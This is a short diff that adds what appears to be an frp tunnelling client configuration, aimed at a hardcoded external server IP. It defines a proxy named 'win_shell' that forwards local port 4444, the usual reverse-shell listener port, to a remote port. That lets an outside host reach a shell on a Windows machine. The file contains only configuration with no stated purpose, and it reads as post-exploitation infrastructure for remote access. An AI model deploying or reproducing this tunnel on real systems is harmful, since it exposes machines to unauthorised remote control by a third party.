@@ -1,0 +1,8 @@
+serverAddr = "167.234.231.216"
+serverPort = 7000
+
+[win_shell]
+type = "tcp"
+localIP = "127.0.0.1"
+localPort = 4444
+remotePort = 14791
